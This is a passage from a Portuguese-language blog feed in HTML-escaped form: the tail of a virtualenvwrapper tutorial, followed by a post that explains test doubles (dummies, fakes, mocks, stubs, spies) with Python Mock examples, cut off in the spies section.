&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ workon teste
$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~/Workspace/teste
$ setvirtualenvproject
Setting project &lt;span class="k"&gt;for&lt;/span&gt; teste to /Users/&amp;lt;user&amp;gt;/Workspace/teste
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Agora toda vez que você fizer um &lt;code&gt;workon&lt;/code&gt;, será automaticamente
direcionado para a pasta &lt;code&gt;~/Workspace/teste&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Quando você trabalha com inúmeros projetos em &lt;em&gt;Python&lt;/em&gt;, fica muito evidente
a necessidade de ambientes virtuais. Ter diferentes &lt;em&gt;libs&lt;/em&gt;, de diferentes
projetos, em diferentes versões, de maneira isolada é sem dúvida nenhuma
uma das maiores vantagens de utilizar &lt;em&gt;virtualenv&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Então, se você quer começar em &lt;em&gt;Python&lt;/em&gt; (de forma "profissional"), a minha
dica é: Comece instalando o &lt;em&gt;virtualenvwrapper&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://virtualenvwrapper.readthedocs.org/en/latest/" title="Leia a documentação da ferramenta"&gt;&lt;em&gt;virtualenvwrapper - Docs&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="virtualenv"></category><category term="virtualenvwrapper"></category><category term="python"></category></entry><entry><title>Os testes e os dublês - Parte 2</title><link href="https://klauslaube.com.br/2015/06/29/os-testes-e-os-dubles-parte-2.html" rel="alternate"></link><published>2015-06-29T12:30:00-03:00</published><updated>2015-06-29T12:30:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2015-06-29:/2015/06/29/os-testes-e-os-dubles-parte-2.html</id><summary type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2014/08/07/os-testes-e-os-dubles-parte-1.html" title="Os testes e os Dublês - Parte 1"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;, vimos um dos
cenários de testes utilizados por times da &lt;a href="http://globo.com" title="Absolutamente tudo sobre notícias, esportes e entretenimento"&gt;&lt;em&gt;Globo.com&lt;/em&gt;&lt;/a&gt;, onde não escrevemos testes "isolados"
(famigerados &lt;em&gt;&lt;a href="https://elearning.industriallogic.com/gh/submit?Action=AlbumContentsAction&amp;amp;album=theBasics&amp;amp;devLanguage=Java" title="Testing Single Responsibilities at High Speed"&gt;microtests&lt;/a&gt;&lt;/em&gt;),
e abusamos da integração entre classes e serviços.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas até mesmo para nós existe um limite que não podemos ultrapassar: O caso
de uma consulta a uma &lt;em&gt;API …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2014/08/07/os-testes-e-os-dubles-parte-1.html" title="Os testes e os Dublês - Parte 1"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;, vimos um dos
cenários de testes utilizados por times da &lt;a href="http://globo.com" title="Absolutamente tudo sobre notícias, esportes e entretenimento"&gt;&lt;em&gt;Globo.com&lt;/em&gt;&lt;/a&gt;, onde não escrevemos testes "isolados"
(famigerados &lt;em&gt;&lt;a href="https://elearning.industriallogic.com/gh/submit?Action=AlbumContentsAction&amp;amp;album=theBasics&amp;amp;devLanguage=Java" title="Testing Single Responsibilities at High Speed"&gt;microtests&lt;/a&gt;&lt;/em&gt;),
e abusamos da integração entre classes e serviços.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Mas até mesmo para nós existe um limite que não podemos ultrapassar: O caso
de uma consulta a uma &lt;em&gt;API&lt;/em&gt; externa, por exemplo. Nesse cenário, precisamos
fingir que estamos fazendo isso, sem perder a segurança em nossas asserções.&lt;/p&gt;
&lt;h2&gt;Dublês ao resgate&lt;/h2&gt;
&lt;p&gt;Como já mencionado, os &lt;em&gt;test doubles&lt;/em&gt; têm por finalidade substituir um objeto
real, afim de validar algum conceito em nossos testes.&lt;/p&gt;
&lt;p&gt;Para auxiliar-nos nessa demanda, vamos utilizar a &lt;strong&gt;Python Mock&lt;/strong&gt;, biblioteca
de &lt;em&gt;mocking&lt;/em&gt; padrão do &lt;em&gt;Python 3&lt;/em&gt;. Com ela, poderemos fingir integrações
complexas da nossa aplicação, com o objetivo de testar um determinado
comportamento em "custo" e tempos atrativos.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/testing-vader.jpg" width="500" height="400" title="I find your lack of tests disturbing (jasonpolites.github.io)" alt="I find your lack of tests disturbing (jasonpolites.github.io)"&gt;&lt;/p&gt;
&lt;p&gt;Se você (assim como eu) ainda está no &lt;em&gt;Python 2.7.X&lt;/em&gt;, podemos instalar a &lt;em&gt;lib&lt;/em&gt;
através do &lt;code&gt;pip&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install mock
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="http://www.voidspace.org.uk/python/mock/#installing" title="Mock - Installing"&gt;Mais instruções para instalação da &lt;em&gt;Mock&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Uma vez instalada, podemos partir para conceituar de forma prática cada um dos
tipos de dublês listados no &lt;em&gt;post&lt;/em&gt; anterior.&lt;/p&gt;
&lt;h2&gt;Dummys&lt;/h2&gt;
&lt;p&gt;Um &lt;em&gt;Dummy Object&lt;/em&gt; é um tipo de dublê muito simples, que é usado apenas para
preencher passagens de parâmetros:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;rodas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;descricao&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;descricao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;descricao&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fabricante&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;

&lt;span class="c1"&gt;# Teste&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_usando_dummy&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;fabricante&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
    &lt;span class="n"&gt;carro&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Fusca&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;carro&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rodas&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como observado, um &lt;em&gt;Dummy&lt;/em&gt; não precisa ser necessariamente um &lt;em&gt;mock&lt;/em&gt;. Um valor
em branco, nulo, uma string vazia, qualquer coisa usada para substituir um
objeto real em uma passagem de parâmetro, pode ser considerado um &lt;em&gt;Dummy&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Fakes&lt;/h2&gt;
&lt;p&gt;Um &lt;em&gt;Fake&lt;/em&gt; é um objeto com certa funcionalidade, muito útil para resolver
alguma dependência em testes, mas que não é ideal para o ambiente de
produção:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;rodas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;descricao&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;descricao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;descricao&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fabricante&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__str__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{0} ({1})&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;descricao&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_descricao&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
        &lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Teste&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;FabricanteFake&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;descricao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Volkswagen&amp;#39;&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_descricao&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;descricao&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_usando_fake&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;fabricante&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;FabricanteFake&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;carro&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Fusca&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Fusca (Volkswagen)&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No exemplo acima, (ainda) não utilizamos nenhum recurso da &lt;strong&gt;Mock&lt;/strong&gt;. Dependendo
do contexto, não precisamos de uma biblioteca para criarmos um &lt;em&gt;Fake&lt;/em&gt;, e isso
pode ser encarado de forma positiva, pois fica muito clara a nossa intenção
no teste.&lt;/p&gt;
&lt;p&gt;É relativamente comum vermos &lt;em&gt;Fakes&lt;/em&gt; sendo utilizados para "dublar" acessos
a um banco de dados. Quando falamos de testes em &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;,
geralmente utilizamos uma persistência mais leve (como um banco &lt;em&gt;SQLite&lt;/em&gt;, por exemplo)
que substitui um banco mais complexo, tornando a nossa suíte de testes
mais simples.&lt;/p&gt;
&lt;h2&gt;Mocks&lt;/h2&gt;
&lt;p&gt;Um tipo de dublê criado para um teste específico. Com ele, somos capazes
de setar retornos de valores pré-definidos, bem como verificar se algum
método foi chamado durante a execução do teste:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;rodas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;descricao&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;descricao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;descricao&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fabricante&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__str__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{0} ({1})&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;descricao&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_descricao&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
        &lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Teste&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_usando_mock&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;fabricante&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MagicMock&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_descricao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;return_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Volkswagen&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;carro&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Fusca&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Fusca (Volkswagen)&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_descricao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assert_called_once_with&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;em&gt;Mocks&lt;/em&gt; são fundamentais quando estamos lidando com interações
das quais não podemos (ou fica muito custoso) prever o comportamento.
Particularmente, gosto de usar &lt;em&gt;Mocks&lt;/em&gt; para garantir que o contrato entre o
meu método/classe e meu serviço/&lt;em&gt;API&lt;/em&gt; esteja coerente.&lt;/p&gt;
&lt;h2&gt;Stubs&lt;/h2&gt;
&lt;p&gt;Semelhantes aos &lt;em&gt;Mocks&lt;/em&gt;, com os &lt;em&gt;Stubs&lt;/em&gt; temos a capacidade de retornar
respostas pré-definidas durante a execução de um teste. A principal diferença
entre ambos é que com &lt;em&gt;Stubs&lt;/em&gt;, não costumamos checar se eles foram propriamente
executados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;rodas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;descricao&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;descricao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;descricao&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fabricante&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__str__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{0} ({1})&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;descricao&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_descricao&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
        &lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Teste&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;mock&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;MagicMock&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_usando_stub&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;fabricante&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MagicMock&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_descricao&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;return_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Volkswagen&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;carro&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Fusca&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;carro&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Fusca (Volkswagen)&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;test_usando_stub&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;em&gt;Stubs&lt;/em&gt; são excelentes para fingir interações com bibliotecas &lt;em&gt;third-party&lt;/em&gt;. Não
precisamos compreender a sua complexidade, apenas fingimos que ela está lá e
retornando valores para os nossos &lt;em&gt;test cases&lt;/em&gt;. Exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt;
&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mymodule.date&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;mock_date&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;mock_date&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;today&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;return_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2010&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;mock_date&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;side_effect&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kw&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kw&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;mymodule&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;today&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2010&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;mymodule&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2009&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2009&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Spies&lt;/h2&gt;
&lt;p&gt;Com &lt;em&gt;Spies&lt;/em&gt;, ao invés de setarmos expectativas, armazenamos as chamadas
realizadas por colaboradores:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Carro&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;rodas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;descricao&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fabricante&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
